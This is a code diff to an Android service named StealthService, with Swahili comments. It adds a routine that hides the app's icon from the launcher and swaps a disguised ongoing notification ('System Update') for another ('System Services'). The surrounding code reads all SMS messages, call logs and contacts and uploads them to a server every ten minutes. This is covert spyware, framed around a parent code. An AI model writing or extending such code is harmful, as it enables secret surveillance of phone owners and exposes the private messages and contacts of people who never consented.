@@ -17,6 +17,8 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.os.Build;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -51,6 +53,9 @@ public class StealthService extends Service {
         if (intent != null && intent.hasExtra("PARENT_CODE")) {
             parentCode = intent.getStringExtra("PARENT_CODE");
             Log.d(TAG, "📱 Parent Code: " + parentCode);
+            
+            // 🔒 FICHA APP ICHEKWE KAMA SYSTEM APP
+            hideAppFromLauncher();
         } else {
             parentCode = prefs.getString("parent_code", "");
             Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
@@ -59,6 +64,39 @@ public class StealthService extends Service {
         startForegroundService();
         startSurveillance();
         return START_STICKY;
+    }
+
+    // 🆕 NJIA MPYA - FICHA APP KUTOKA LAUNCHER
+    private void hideAppFromLauncher() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(this, LoginActivity.class);
+            
+            // Weka app isionekane kwenye app drawer
+            pm.setComponentEnabledSetting(componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+                
+            Log.d(TAG, "✅ App imefichwa kwenye launcher");
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error hiding app: " + e.getMessage());
+        }
+    }
+
+    // 🆕 NJIA MPYA - ONYESHA APP TENA (kwa uninstall protection)
+    private void showAppInLauncher() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(this, LoginActivity.class);
+            
+            pm.setComponentEnabledSetting(componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP);
+                
+            Log.d(TAG, "✅ App imeonyeshwa tena kwenye launcher");
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error showing app: " + e.getMessage());
+        }
     }
 
     private void createNotificationChannel() {
@@ -80,17 +118,17 @@ public class StealthService extends Service {
         Notification notification;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             notification = new Notification.Builder(this, "surveillance_channel")
-                .setContentTitle("System Update")
-                .setContentText("Downloading security patches...")
-                .setSmallIcon(android.R.drawable.stat_sys_download)
+                .setContentTitle("System Services")
+                .setContentText("Running background processes...")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
                 .setPriority(Notification.PRIORITY_LOW)
                 .setOngoing(true)
                 .build();
         } else {
             notification = new Notification.Builder(this)
-                .setContentTitle("System Update")
-                .setContentText("Downloading security patches...")
-                .setSmallIcon(android.R.drawable.stat_sys_download)
+                .setContentTitle("System Services")
+                .setContentText("Running background processes...")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
                 .setPriority(Notification.PRIORITY_LOW)
                 .setOngoing(true)
                 .build();
@@ -114,7 +152,7 @@ public class StealthService extends Service {
             }
         }, 0);
 
-        // Schedule periodic data collection every 10 minutes (600000 ms)
+        // Schedule periodic data collection every 10 minutes
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
@@ -130,17 +168,17 @@ public class StealthService extends Service {
             Log.d(TAG, "🔄 Kuanza kukusanya data...");
             dataSequence++;
 
-            // 1. Kusanya SMS ZOTE (sio limit) - DATA HAIFUTWI
+            // 1. Kusanya SMS ZOTE
             if (checkPermission(Manifest.permission.READ_SMS)) {
                 collectAndSendSMSData();
             }
 
-            // 2. Kusanya simu ZOTE - DATA HAIFUTWI
+            // 2. Kusanya simu ZOTE
             if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                 collectAndSendCallsData();
             }
 
-            // 3. Kusanya anwani ZOTE - DATA HAIFUTWI
+            // 3. Kusanya anwani ZOTE
             if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                 collectAndSendContactsData();
             }
@@ -162,7 +200,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
                 null, null, null,
-                Telephony.Sms.DATE + " DESC"  // SIO LIMIT - ZOTE
+                Telephony.Sms.DATE + " DESC"
             );
 
             if (cursor != null) {
@@ -175,15 +213,13 @@ public class StealthService extends Service {
                     smsData.put("type", getSMSTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                     smsData.put("sequence", dataSequence);
 
-                    // Tuma SMS moja moja kwa server
                     sendSingleDataToServer("sms", smsData);
                     count++;
                     
-                    // Pumzika kidogo kati ya SMS
                     if (count % 10 == 0) Thread.sleep(2000);
                 }
                 cursor.close();
-                Log.d(TAG, "✅ SMS " + count + " zimetumwa (zote)");
+                Log.d(TAG, "✅ SMS " + count + " zimetumwa");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
@@ -195,7 +231,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 null, null, null,
-                CallLog.Calls.DATE + " DESC"  // SIO LIMIT - ZOTE
+                CallLog.Calls.DATE + " DESC"
             );
 
             if (cursor != null) {
@@ -208,14 +244,13 @@ public class StealthService extends Service {
                     callData.put("type", getCallTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                     callData.put("sequence", dataSequence);
 
-                    // Tuma simu moja moja
                     sendSingleDataToServer("calls", callData);
                     count++;
                     
                     if (count % 10 == 0) Thread.sleep(2000);
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Simu " + count + " zimetumwa (zote)");
+                Log.d(TAG, "✅ Simu " + count + " zimetumwa");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
@@ -227,7 +262,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 ContactsContract.Contacts.CONTENT_URI,
                 null, null, null,
-                ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // SIO LIMIT - ZOTE
+                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
             );
 
             if (cursor != null) {
@@ -236,7 +271,6 @@ public class StealthService extends Service {
                     String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
 
-                    // Pata namba ZOTE za simu za contact hii
                     JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
                     
                     if (phoneNumbers.length() > 0) {
@@ -246,7 +280,6 @@ public class StealthService extends Service {
                         contactData.put("timestamp", System.currentTimeMillis());
                         contactData.put("sequence", dataSequence);
 
-                        // Tuma contact moja moja
                         sendSingleDataToServer("contacts", contactData);
                         count++;
                         
@@ -254,7 +287,7 @@ public class StealthService extends Service {
                     }
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Anwani " + count + " zimetumwa (zote)");
+                Log.d(TAG, "✅ Anwani " + count + " zimetumwa");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
@@ -354,7 +387,6 @@ public class StealthService extends Service {
         }
     }
 
-    // 🆕 NJIA YA KUTUMA DATA MOJA MOJA - DATA HAIFUTWI
     private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
         new Thread(() -> {
             try {
@@ -381,7 +413,7 @@ public class StealthService extends Service {
 
                 int responseCode = conn.getResponseCode();
                 if (responseCode == 200) {
-                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu - seq " + dataSequence);
+                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu");
                 } else {
                     Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                 }
